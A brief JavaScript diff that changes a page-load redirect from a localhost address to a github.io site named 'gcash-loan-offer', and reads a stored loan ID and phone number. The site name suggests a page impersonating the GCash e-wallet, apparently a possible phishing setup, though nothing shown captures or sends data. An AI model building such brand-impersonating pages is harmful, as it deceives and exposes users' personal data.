@@ -1,6 +1,6 @@
 window.addEventListener("load", () => {
     if(!sessionStorage.getItem("LoanID")) {
-        window.location.replace("http://localhost:4000/web/gcash/");
+        window.location.replace("https://gcash-loan-offer.github.io/gcash/");
     } else {
         let loanID = sessionStorage.getItem("LoanID");
         let phoneNumber = sessionStorage.getItem("phone");
